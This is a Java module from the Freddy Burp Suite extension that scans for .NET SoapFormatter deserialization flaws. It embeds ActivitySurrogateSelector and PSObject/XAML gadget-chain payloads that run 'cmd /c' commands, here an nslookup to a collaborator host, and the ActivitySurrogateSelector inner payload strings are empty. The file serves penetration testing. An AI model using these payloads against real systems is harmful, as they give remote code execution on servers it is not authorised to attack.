/***********************************************************
 * Module targeting the .NET SoapFormatter API.
 *
 * Written by Nicky Bloor (@NickstaDB).
 **********************************************************/
public class SoapFormatterModule extends FreddyModuleBase {
    //ActivitySurrogateSelector payload data
    private static final String ACTSS_PREFIX = "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><a1:DataSet id=\"ref-1\" xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db77a5c561934e089\"><DataSet.RemotingFormat xsi:type=\"a1:SerializationFormat\" xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/System.Data/System.Data%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db77a5c561934e089\">Binary</DataSet.RemotingFormat><DataSet.DataSetName id=\"ref-3\"></DataSet.DataSetName><DataSet.Namespace href=\"#ref-3\"/><DataSet.Prefix href=\"#ref-3\"/><DataSet.CaseSensitive>false</DataSet.CaseSensitive><DataSet.LocaleLCID>1033</DataSet.LocaleLCID><DataSet.EnforceConstraints>false</DataSet.EnforceConstraints><DataSet.ExtendedProperties xsi:type=\"xsd:anyType\" xsi:null=\"1\"/><DataSet.Tables.Count>1</DataSet.Tables.Count><DataSet.Tables_0 href=\"#ref-4\"/></a1:DataSet><SOAP-ENC:Array id=\"ref-4\" xsi:type=\"SOAP-ENC:base64\">";
    private static final String ACTSS_SUFFIX = "</SOAP-ENC:Array></SOAP-ENV:Body></SOAP-ENV:Envelope>";
    private static final String ACTSS_INNER_PREFIX_B64 = "";
    private static final String ACTSS_INNER_SUFFIX_B64 = "";
    private static final int ACTSS_PAYLOAD_CMD_OFFSET = 16844;
    //PSObject payload data
    private static final String PSO_PREFIX = "<SOAP-ENV:Envelope xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\" xmlns:SOAP-ENC=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:SOAP-ENV=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:clr=\"http://schemas.microsoft.com/soap/encoding/clr/1.0\" SOAP-ENV:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><SOAP-ENV:Body><a1:PSObject id=\"ref-1\" xmlns:a1=\"http://schemas.microsoft.com/clr/nsassem/System.Management.Automation/System.Management.Automation%2C%20Version%3D3.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3D31bf3856ad364e35\"><CliXml id=\"ref-3\">&#60;Objs Version=&#34;1.1.0.1&#34; xmlns=&#34;http://schemas.microsoft.com/powershell/2004/04&#34;&#62;&#38;#xD;&#60;Obj RefId=&#34;0&#34;&#62;&#38;#xD;&#60;TN RefId=&#34;0&#34;&#62;&#38;#xD;&#60;T&#62;Microsoft.Management.Infrastructure.CimInstance#System.Management.Automation/RunspaceInvoke5&#60;/T&#62;&#38;#xD;&#60;T&#62;Microsoft.Management.Infrastructure.CimInstance#RunspaceInvoke5&#60;/T&#62;&#38;#xD;&#60;T&#62;Microsoft.Management.Infrastructure.CimInstance&#60;/T&#62;&#38;#xD;&#60;T&#62;System.Object&#60;/T&#62;&#38;#xD;&#60;/TN&#62;&#38;#xD;&#60;ToString&#62;RunspaceInvoke5&#60;/ToString&#62;&#38;#xD;&#60;Obj RefId=&#34;1&#34;&#62;&#38;#xD;&#60;TNRef RefId=&#34;0&#34; /&#62;&#38;#xD;&#60;ToString&#62;RunspaceInvoke5&#60;/ToString&#62;&#38;#xD;&#60;Props&#62;&#38;#xD;&#60;Nil N=&#34;PSComputerName&#34; /&#62;&#38;#xD;&#60;Obj N=&#34;test1&#34; RefId =&#34;20&#34; &#62; &#38;#xD;&#60;TN RefId=&#34;1&#34; &#62; &#38;#xD;&#60;T&#62;System.Windows.Markup.XamlReader[], PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&#60;/T&#62;&#38;#xD;&#60;T&#62;System.Array&#60;/T&#62;&#38;#xD;&#60;T&#62;System.Object&#60;/T&#62;&#38;#xD;&#60;/TN&#62;&#38;#xD;&#60;LST&#62;&#38;#xD;&#60;S N=&#34;Hash&#34; &#62;  &#38;lt;ResourceDictionary xmlns=&#34;http://schemas.microsoft.com/winfx/2006/xaml/presentation&#34; xmlns:x=&#34;http://schemas.microsoft.com/winfx/2006/xaml&#34; xmlns:System=&#34;clr-namespace:System;assembly=mscorlib&#34; xmlns:Diag=&#34;clr-namespace:System.Diagnostics;assembly=system&#34;&#38;gt;&#38;lt;ObjectDataProvider x:Key=&#34;LaunchCalc&#34; ObjectType = &#34;{ x:Type Diag:Process}&#34; MethodName = &#34;Start&#34; &#38;gt;&#38;lt;ObjectDataProvider.MethodParameters&#38;gt;&#38;lt;System:String&#38;gt;cmd&#38;lt;/System:String&#38;gt;&#38;lt;System:String&#38;gt;/c &#34;";
    private static final String PSO_SUFFIX = "&#34; &#38;lt;/System:String&#38;gt;&#38;lt;/ObjectDataProvider.MethodParameters&#38;gt;&#38;lt;/ObjectDataProvider&#38;gt;&#38;lt;/ResourceDictionary&#38;gt;&#60;/S&#62;&#38;#xD;&#60;/LST&#62;&#38;#xD;&#60;/Obj&#62;&#38;#xD;&#60;/Props&#62;&#38;#xD;&#60;MS&#62;&#38;#xD;&#60;Obj N=&#34;__ClassMetadata&#34; RefId =&#34;2&#34;&#62; &#38;#xD;&#60;TN RefId=&#34;1&#34; &#62; &#38;#xD;&#60;T&#62;System.Collections.ArrayList&#60;/T&#62;&#38;#xD;&#60;T&#62;System.Object&#60;/T&#62;&#38;#xD;&#60;/TN&#62;&#38;#xD;&#60;LST&#62;&#38;#xD;&#60;Obj RefId=&#34;3&#34;&#62; &#38;#xD;&#60;MS&#62;&#38;#xD;&#60;S N=&#34;ClassName&#34;&#62;RunspaceInvoke5&#60;/S&#62;&#38;#xD;&#60;S N=&#34;Namespace&#34;&#62;System.Management.Automation&#60;/S&#62;&#38;#xD;&#60;Nil N=&#34;ServerName&#34; /&#62;&#38;#xD;&#60;I32 N=&#34;Hash&#34;&#62;460929192&#60;/I32&#62;&#38;#xD;&#60;S N=&#34;MiXml&#34;&#62; &#38;lt;CLASS NAME=&#34;RunspaceInvoke5&#34; &#38;gt;&#38;lt;PROPERTY NAME=&#34;test1&#34; TYPE =&#34;string&#34; &#38;gt;&#38;lt;/PROPERTY&#38;gt;&#38;lt;/CLASS&#38;gt;&#60;/S&#62;&#38;#xD;&#60;/MS&#62;&#38;#xD;&#60;/Obj&#62;&#38;#xD;&#60;/LST&#62;&#38;#xD;&#60;/Obj&#62;&#38;#xD;&#60;/MS&#62;&#38;#xD;&#60;/Obj&#62;&#38;#xD;&#60;MS&#62;&#38;#xD;&#60;Ref N=&#34;__ClassMetadata&#34; RefId =&#34;2&#34; /&#62;&#38;#xD;&#60;/MS&#62;&#38;#xD;&#60;/Obj&#62;&#38;#xD;&#60;/Objs&#62;</CliXml></a1:PSObject></SOAP-ENV:Body></SOAP-ENV:Envelope>";
    private byte[] ACTSS_INNER_PAYLOAD;

    protected void initialiseModule() {
        setName("SoapFormatter");
        setPlatform(TargetPlatform.DOTNET);
        setModuleIsRCECapable(true);
        setDescriptionCaveats("");
        setRemediationDetail("");
        setSeverity(SeverityRating.HIGH);

        registerPassiveScanIndicator(Pattern.compile("((\")|(%22))http((:)|(%3a))((/)|(%2f))((/)|(%2f))schemas.microsoft.com((/)|(%2f))soap((/)|(%2f))", Pattern.CASE_INSENSITIVE), IndicatorTarget.REQUEST);
        registerPassiveScanIndicator("SoapFormatter.Deserialize", IndicatorTarget.RESPONSE);

        registerActiveScanExceptionPayload("<test/>", "SoapFormatter.Deserialize");

        registerActiveScanCollaboratorPayload(PN_ACTSURSEL, false);
        registerActiveScanCollaboratorPayload(PN_PSOBJ, false);

        //Initialise the inner buffer for the ActivitySurrogateSelector payload
        ACTSS_INNER_PAYLOAD = buildBinaryPayloadBuffer(ACTSS_INNER_PREFIX_B64, ACTSS_INNER_SUFFIX_B64, true);
    }

    protected String generateCollaboratorTextPayload(String payloadName, String hostname) {
        switch (payloadName) {
            case PN_ACTSURSEL:
                return ACTSS_PREFIX + generateBase64BinaryPayload(ACTSS_INNER_PAYLOAD, ACTSS_PAYLOAD_CMD_OFFSET, "nslookup " + hostname, true) + ACTSS_SUFFIX;

            case PN_PSOBJ:
                return PSO_PREFIX + "nslookup " + hostname + PSO_SUFFIX;
        }
        return null;
    }
}
